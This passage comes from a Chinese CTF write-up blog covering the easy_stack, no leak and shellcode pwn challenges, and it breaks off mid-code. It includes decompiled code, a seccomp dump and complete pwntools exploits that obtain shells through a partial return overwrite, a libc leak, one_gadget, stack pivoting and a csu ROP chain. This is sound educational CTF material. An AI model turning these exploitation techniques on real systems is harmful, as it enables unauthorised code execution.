= v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( a2 &gt; v2 );</span><br><span class="line">  <span class="keyword">if</span> ( s[v6] == <span class="number">10</span> &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(a1, s, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到存在明显的栈溢出漏洞。不过比较棘手的是程序开启了PIE导致我们无法多次利用此漏洞，所以我们目前来看迫切需要的就是重复多次扩大漏洞。</p><p>在栈方面比较熟知扩大漏洞的方法是<code>fini_array</code>劫持，不过这里不存在任意写所以无法实现。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000007C0                               public _start</span><br><span class="line">.text:00000000000007C0                               _start proc near                        ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000007C0                               ; __unwind &#123;</span><br><span class="line">.text:00000000000007C0 31 ED                         xor     ebp, ebp</span><br><span class="line">.text:00000000000007C2 49 89 D1                      mov     r9, rdx                         ; rtld_fini</span><br><span class="line">.text:00000000000007C5 5E                            pop     rsi                             ; argc</span><br><span class="line">.text:00000000000007C6 48 89 E2                      mov     rdx, rsp                        ; ubp_av</span><br><span class="line">.text:00000000000007C9 48 83 E4 F0                   and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000007CD 50                            push    rax</span><br><span class="line">.text:00000000000007CE 54                            push    rsp                             ; stack_end</span><br><span class="line">.text:00000000000007CF 4C 8D 05 FA 02 00 00          lea     r8, __libc_csu_fini             ; fini</span><br><span class="line">.text:00000000000007D6 48 8D 0D 83 02 00 00          lea     rcx, __libc_csu_init            ; init</span><br><span class="line">.text:00000000000007DD 48 8D 3D E0 01 00 00          lea     rdi, main                       ; main</span><br><span class="line">.text:00000000000007E4 FF 15 F6 07 20 00             call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000007E4</span><br><span class="line">.text:00000000000007EA F4                            hlt</span><br><span class="line">.text:00000000000007EA                               ; &#125; // starts at 7C0</span><br><span class="line">.text:00000000000007EA</span><br><span class="line">.text:00000000000007EA                               _start endp</span><br></pre></td></tr></table></figure><p>总所周知，程序的入口是<code>_start</code>函数，并且我们知道这里的执行顺序是<code>__libc_csu_init</code>=&gt;<code>main</code>=&gt;<code>__libc_csu_fini</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221013152012744.png"                      alt="image-20221013152012744"                ></p><p>可以看到在进入函数不过多久就开始调用了<code>_libc_csu_init</code>，并且把main地址放在了<code>rsp+0x18</code>位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000021A35                 lea     rdi, [rsp+0B8h+var_98] ; env</span><br><span class="line">.text:0000000000021A3A                 call    _setjmp</span><br><span class="line">.text:0000000000021A3F                 test    eax, eax</span><br><span class="line">.text:0000000000021A41                 jnz     short loc_21A8E</span><br><span class="line">.text:0000000000021A43                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000021A4C                 mov     [rsp+0B8h+var_50], rax</span><br><span class="line">.text:0000000000021A51                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000021A5A                 mov     [rsp+0B8h+var_48], rax</span><br><span class="line">.text:0000000000021A5F                 lea     rax, [rsp+0B8h+var_98]</span><br><span class="line">.text:0000000000021A64                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000021A6D                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000021A74                 mov     rsi, [rsp+8]</span><br><span class="line">.text:0000000000021A79                 mov     edi, [rsp+14h]</span><br><span class="line">.text:0000000000021A7D                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000021A80                 mov     rax, [rsp+18h]</span><br><span class="line">.text:0000000000021A85                 call    rax</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221013153034952.png"                      alt="image-20221013153034952"                ></p><p>随后调用main函数，然后从main函数返回时的ret地址自然而然成了call的下一行。所以如果我们可以覆盖末尾字节为<code>0x80</code>即可重新进入main函数达到扩大漏洞的效果。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./easy_stack&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p16(<span class="number">0x80</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21A80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + flat(libc_base+<span class="number">0x415a6</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no leak"></a>no leak</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里吐槽一下这个平台，给的libc不是常见libc，并且也不给ld文件，上面一道可以泄漏还好这个无法泄漏只能爆破偏移，太浪费时间了，基本就是盲调。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，就只有简单的栈溢出，并且不存在任何的输出函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221014184632346.png"                      alt="image-20221014184632346"                ></p><p>这里还有一个吐槽点，因为程序保护是<code>Full RELRO</code>所以走ret2resolve是行不通的，所以下意识就是去找gadget。这里的吐槽点就是在ida和ROPgadget里面都找到有用的gadget是在ropper导出的内容才找到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000400518: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br></pre></td></tr></table></figure><p>这里依旧需要熟知程序的运行机制，在上面一道题中我们提到了，程序开始时<code>_start</code>=&gt;<code>__libc_start_main</code>=&gt;<code>main</code>，在最后这里进入main时是用call进入的，所以会在栈上残留下<code>__libc_start_main+231</code>的地址，不过这里因为我们要持续劫持执行流所以我们不能利用这里，不过这里依旧存在很多可以用的，这里就不再赘述，可以自己看一下<code>__libc_start_main</code>的函数代码。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>看得出来上面的gadget是可以修改任意地址上内容的值，所以如果我们在已知地址上放上libc地址即可根据偏移得到system的地址，最后通过csu来call已知位置即可。</p><p>最后得出的思路就是：</p><p><code>栈迁移到bss段</code>=&gt;<code>在bss布置rop进行csu调用__libc_start_main</code>=&gt;<code>在__libc_start_main中调用read覆盖栈</code>=&gt;<code>使用gadget修改残留位置指向system并用csu调用</code></p><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./no_leak&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./no_leak&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss = elf.bss()+<span class="number">0x500</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">_start = <span class="number">0x400474</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005d1</span></span><br><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span></span><br><span class="line">gadget = <span class="number">0x0000000000400518</span></span><br><span class="line">pop_rbp = <span class="number">0x00000000004004b8</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x4005CA</span></span><br><span class="line">one_gadget = <span class="number">0x41720</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*&#x27;+hex(elf.plt[&#x27;read&#x27;]))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+flat(bss, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">                         bss, <span class="number">0</span>, elf.plt[<span class="string">&#x27;read&#x27;</span>], <span class="number">0x400564</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = flat(<span class="number">0x196082</span>, <span class="number">0x4005CA</span>, (one_gadget-<span class="number">0x21a87</span>)-<span class="number">1</span>, (one_gadget-<span class="number">0x21a87</span>),</span><br><span class="line">               (<span class="number">0x601558</span> - (((one_gadget-<span class="number">0x21a87</span>)-<span class="number">1</span>)*<span class="number">8</span>)), elf.symbols[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, <span class="number">0x601488</span>, <span class="number">0x4005B0</span>, _start)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x601488</span>+<span class="number">0x90</span>+<span class="number">8</span></span><br><span class="line">payload = flat(pop_rbx_rbp_r12_r13_r14_r15,</span><br><span class="line">               -<span class="number">0x371f08</span>, [<span class="number">0</span>]*<span class="number">5</span>, pop_rbp, <span class="number">0x601448</span>+<span class="number">0x3d</span>, gadget, <span class="number">0x4005CA</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x601448</span>, bin_sh_addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000000000400416</span>, <span class="number">0x4005B0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.sendline(p64(main))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>在以往遇到沙箱的问题都是使用ORW，并且只是常规的进行调用，并没有更加深层次的讨论。这里就借此题目更加深入讨论一下在CTF中常见的沙箱保护以及绕过方式。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v21; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v29; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v33; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v37; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v41; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v44; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v45; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v47; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v48; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">32</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">21</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">5</span>;</span><br><span class="line">  v21 = <span class="number">21</span>;</span><br><span class="line">  v22 = <span class="number">5</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">37</span>;</span><br><span class="line">  v25 = <span class="number">21</span>;</span><br><span class="line">  v26 = <span class="number">4</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">1</span>;</span><br><span class="line">  v29 = <span class="number">21</span>;</span><br><span class="line">  v30 = <span class="number">3</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">21</span>;</span><br><span class="line">  v34 = <span class="number">2</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">9</span>;</span><br><span class="line">  v37 = <span class="number">21</span>;</span><br><span class="line">  v38 = <span class="number">1</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">231</span>;</span><br><span class="line">  v41 = <span class="number">6</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">6</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int64)&amp;v13;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_write(<span class="number">1u</span>, <span class="string">&quot;---------- Shellcode ----------\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  v2 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="keyword">unsigned</span> __int64)arg3, v3);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v6 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Input your shellcode: &quot;</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  v7 = sys_read(<span class="number">0</span>, v5, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v5[(<span class="keyword">int</span>)v7 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[(<span class="keyword">int</span>)v7 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v8 = v7 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[i] &lt;= <span class="number">0x1F</span> || v5[i] == <span class="number">0x7F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Check!\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))v5)();</span><br><span class="line">LABEL_10:</span><br><span class="line">  v11 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，限制了输入的shellcode为可见字符，这里虽然ida翻译为了<code>if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )</code>不过在实际调试过程中发现就是不允许大于<code>0x7f</code>，上面开启了sandbox。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@0df3326fd7c0:/ctf/work/download <span class="comment"># seccomp-tools dump ./shellcode</span></span><br><span class="line">---------- Shellcode ----------</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  <span class="keyword">if</span> (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  <span class="keyword">if</span> (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  <span class="keyword">if</span> (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  <span class="keyword">if</span> (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line">root@0df3326fd7c0:/ctf/work/download <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果按照我以往的思维方式会认为这道题目是没法完成的，应为没有open调用。所以下面就讲解一下sandbox的一些利用技巧。</p><h3 id="sandbox绕过"><a href="#sandbox绕过" class="headerlink" title="sandbox绕过"></a>sandbox绕过</h3><p>这里拿一个平时十分常见的沙箱规则做讲解：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span 